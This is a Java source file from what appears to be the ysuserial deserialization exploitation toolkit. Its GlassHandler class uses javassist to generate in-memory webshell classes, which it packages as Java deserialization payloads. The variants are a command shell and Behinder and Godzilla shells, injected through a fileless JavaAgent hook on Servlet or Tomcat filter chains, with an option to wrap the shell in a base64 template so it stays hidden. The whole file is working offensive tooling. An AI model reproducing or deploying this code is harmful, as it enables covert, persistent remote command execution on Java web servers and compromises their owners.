package org.su18.ysuserial.payloads.handle;

import javassist.CtClass;
import javassist.bytecode.*;
import org.apache.commons.codec.binary.Base64;
import org.su18.ysuserial.payloads.util.Gadgets;

import java.io.FileInputStream;
import java.util.List;

import static org.su18.ysuserial.payloads.config.Config.*;
import static org.su18.ysuserial.payloads.config.HookPointConfig.*;
import static org.su18.ysuserial.payloads.config.MemShellPayloads.*;
import static org.su18.ysuserial.payloads.handle.ClassFieldHandler.*;
import static org.su18.ysuserial.payloads.handle.ClassMethodHandler.*;
import static org.su18.ysuserial.payloads.handle.ClassNameHandler.*;
import static org.su18.ysuserial.payloads.handle.ClassNameHandler.searchClassByName;
import static org.su18.ysuserial.payloads.util.Utils.*;
import static org.su18.ysuserial.payloads.util.Utils.base64Encode;

/**
 * @author su18
 */
public class GlassHandler {

	public static CtClass generateClass(String target) throws Exception {
		String  newClassName = generateClassName();
		CtClass ctClass      = generateClass(target, newClassName);

		// 如果需要，保存类文件
		saveCtClassToFile(ctClass);
		return ctClass;
	}


	public static CtClass generateClass(String target, String newClassName) throws Exception {
		if (target.startsWith("EX-")) {
			target = target.substring(3);

			// 内存马类型
			String shellType     = "";
			String memShellName  = "";
			Class  memShellClazz = null;

			// 如果命令以 MS 开头，则代表是注入内存马
			if (target.startsWith("MS-")) {
				target = target.substring(3);

				if (target.contains("-")) {
					String[] commands = target.split("[-]");
					memShellName = commands[0];
					shellType = target.substring(target.indexOf("-") + 1);
				} else {
					memShellName = target;
					shellType = "cmd";
				}
			} else if (target.startsWith("Agent")) {
				// 如果以 Agent 开头，则使用 AgentNoFile 动态进行 JavaAgent 注入
				// EX-Agent-Lin/Win-Servlet-bx
				String[] commands = target.split("[-]");
				return generateAgentClass(commands[1], commands[2], commands.length > 3 ? commands[3] : "");
			} else {
				// 否则是回显类，或者其他功能
				memShellName = target;
			}

			String result = searchClassByName(memShellName);
			if (result != null) {
				memShellClazz = Class.forName(result, false, Gadgets.class.getClassLoader());
			} else {
				throw new IllegalArgumentException("Input Error,Please Check Your MemShell Name!");
			}

			return generateClass(memShellClazz, shellType, newClassName);
		}

		// 如果命令以 LF- 开头 （Local File），则程序可以生成一个能加载本地指定类字节码并初始化的逻辑，后面跟文件路径-类名
		if (target.startsWith("LF-")) {
			target = target.substring(3);
			String  filePath = target.contains("-") ? target.split("[-]")[0] : target;
			CtClass ctClass  = POOL.makeClass(new FileInputStream(filePath));
			ctClass.setName(newClassName);

			// 对本地加载的类进行缩短操作
			shrinkBytes(ctClass);

			// 使用 ClassLoaderTemplate 进行加载
			return encapsulationByClassLoaderTemplate(ctClass.toBytecode());
		}

		return null;
	}

	public static CtClass generateClass(Class clazz, String shellType, String newClassName) throws Exception {

		CtClass ctClass   = null;
		byte[]  byteCodes = null;

		String exClassName = clazz.getName();
		ctClass = POOL.get(exClassName);

		// 为 Echo 类添加 CMD_HEADER_STRING
		insertFieldIfExists(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(CMD_HEADER_STRING) + ";");

		// 为 DefineClassFromParameter 添加自定义函数功能
		insertFieldIfExists(ctClass, "parameter", "public static String parameter = " + converString(PARAMETER) + ";");

		// 为内存马添加名称
		insertFieldIfExists(ctClass, "NAME", "public static String NAME=" + converString(getHumanName(newClassName, "Filter")) + ";");

		// 为内存马添加地址
		insertFieldIfExists(ctClass, "pattern", "public static String pattern = " + converString(URL_PATTERN) + ";");

		// 根据不同的内存马类型，插入不同的方法、属性
		insertKeyMethodByClassName(ctClass, exClassName, shellType);

		// 为类设置新的类名
		ctClass.setName(newClassName);

		// 为 Struts2ActionMS 额外处理，防止框架找不到的情况
		insertFieldIfExists(ctClass, "thisClass", "public static String thisClass = \"" + base64Encode(ctClass.toBytecode()) + "\";");

		shrinkBytes(ctClass);
		byteCodes = ctClass.toBytecode();

		if (HIDE_MEMORY_SHELL) {
			switch (HIDE_MEMORY_SHELL_TYPE) {
				case 1:
					break;
				case 2:
					CtClass newClass = POOL.get("org.su18.ysuserial.payloads.templates.HideMemShellTemplate");
					newClass.setName(generateClassName());
					String content = "b64=\"" + Base64.encodeBase64String(byteCodes) + "\";";
					String cName = "className=\"" + ctClass.getName() + "\";";
					newClass.defrost();
					newClass.makeClassInitializer().insertBefore(content);
					newClass.makeClassInitializer().insertBefore(cName);

					ctClass = newClass;
					break;
			}
		}

		return ctClass;
	}


	public static CtClass generateAgentClass(String osType, String hookType, String args) throws Exception {
		CtClass agent = POOL.get(searchClassByName("AgentLoaderTemplate"));

		// 准备 SuURLConnection/SuURLStreamHandler/Javassist Jar 包
		prepareMemoryJar(agent);

		// 根据选定的不同操作系统类型，准备不同的的 AgentNoFile 类
		String agentNoFileName = osType.equals("win") ? "AgentNoFileForWindows" : "AgentNoFileForLinux";
		prepareAgentNoFile(agentNoFileName, agent);

		// 准备要 Hook 的类名、方法、内容
		prepareClassModifier(agent, hookType, args);

		agent.setName(generateClassName());

		// 保存
		saveCtClassToFile(agent);
		return agent;
	}

	public static void prepareMemoryJar(CtClass templateClass) throws Exception {
		// 首先将 SuURLConnection/SuURLStreamHandler 改名
		final String nameA    = searchClassByName("SuURLConnection");
		final String newNameA = generateClassName();
		final String nameB    = searchClassByName("SuURLStreamHandler");
		final String newNameB = generateClassName();
		CtClass      ctClassA = POOL.get(nameA);
		ctClassA.setName(newNameA);
		CtClass ctClassB = POOL.get(nameB);
		ctClassB.setName(newNameB);

		insertField(ctClassA, "STREAM_HANDLER_CLASSNAME", "public static String STREAM_HANDLER_CLASSNAME = \"" + newNameB + "\";");
		insertField(ctClassB, "URL_CONNECTION_CLASSNAME", "public static String URL_CONNECTION_CLASSNAME = \"" + newNameA + "\";");

		shrinkBytes(ctClassA);
		shrinkBytes(ctClassB);

		insertField(templateClass, "SU_URL_CONNECTION_BYTES", "public static String SU_URL_CONNECTION_BYTES = \"" + base64Encode(ctClassA.toBytecode()) + "\";");
		insertField(templateClass, "SU_URL_STREAM_HANDLER_BYTES", "public static String SU_URL_STREAM_HANDLER_BYTES = \"" + base64Encode(ctClassB.toBytecode()) + "\";");
	}

	public static void prepareAgentNoFile(String className, CtClass templateClass) throws Exception {
		CtClass agentNoFile = POOL.get(searchClassByName(className));
		shrinkBytes(agentNoFile);
		agentNoFile.setName(generateClassName());
		insertField(templateClass, "AGENT_NO_FILE_BYTES", "public static String AGENT_NO_FILE_BYTES = \"" + base64Encode(agentNoFile.toBytecode()) + "\";");
	}


	public static void prepareClassModifier(CtClass templateClass, String hookType, String args) throws Exception {
		CtClass classModifier = POOL.get(searchClassByName("ClassModifier"));
		String  shell         = "";

		// 插入 Hook 点
		if (hookType.equals("Servlet")) {
			// 插入 Hook Class 基本信息
			insertInitHookClassINFORMATION(classModifier, BasicServletHook);
		} else if (hookType.equals("Filter")) {
			insertInitHookClassINFORMATION(classModifier, TomcatFilterChainHook);
		}

		// 如果是冰蝎逻辑
		if (args.equals("bx")) {
			shell = base64Decode(BEHINDER_SHELL_FOR_AGENT);
			shell = String.format(shell, URL_PATTERN.substring(1), HEADER_KEY, HEADER_VALUE, PASSWORD);
		} else if (args.equals("gz")) {
			shell = base64Decode(GODZILLA_SHELL_FOR_AGENT);
			shell = String.format(shell, URL_PATTERN.substring(1), HEADER_KEY, HEADER_VALUE, PASSWORD_ORI, GODZILLA_KEY);
		} else if (args.equals("gzraw")) {
			shell = base64Decode(GODZILLA_RAW_FOR_AGENT);
			shell = String.format(shell, URL_PATTERN.substring(1), HEADER_KEY, HEADER_VALUE, GODZILLA_KEY);
		} else {
			// 默认 cmd 逻辑
			shell = base64Decode(CMD_SHELL_FOR_AGENT);
			shell = String.format(shell, URL_PATTERN.substring(1), HEADER_KEY, HEADER_VALUE, CMD_HEADER_STRING);
		}
		// 替换密码，添加 Shell Code
		insertField(classModifier, "HOOK_METHOD_CODE", "public static String HOOK_METHOD_CODE = \"" + base64Encode(shell.getBytes()) + "\";");

		shrinkBytes(classModifier);
		classModifier.setName(generateClassName());
		insertField(templateClass, "CLASS_MODIFIER_BYTES", "public static String CLASS_MODIFIER_BYTES = \"" + base64Encode(classModifier.toBytecode()) + "\";");
	}

	// 统一处理，删除一些不影响使用的 Attribute 降低类字节码的大小
	public static void shrinkBytes(CtClass ctClass) {
		ClassFile classFile = ctClass.getClassFile2();
		classFile.removeAttribute(SourceFileAttribute.tag);
		classFile.removeAttribute(LineNumberAttribute.tag);
		classFile.removeAttribute(LocalVariableAttribute.tag);
		classFile.removeAttribute(LocalVariableAttribute.typeTag);
		classFile.removeAttribute(DeprecatedAttribute.tag);
		classFile.removeAttribute(SignatureAttribute.tag);
		classFile.removeAttribute(StackMapTable.tag);

		List<MethodInfo> list = classFile.getMethods();
		for (MethodInfo info : list) {
			info.removeAttribute("RuntimeVisibleAnnotations");
			info.removeAttribute("RuntimeInvisibleAnnotations");
		}
	}

}
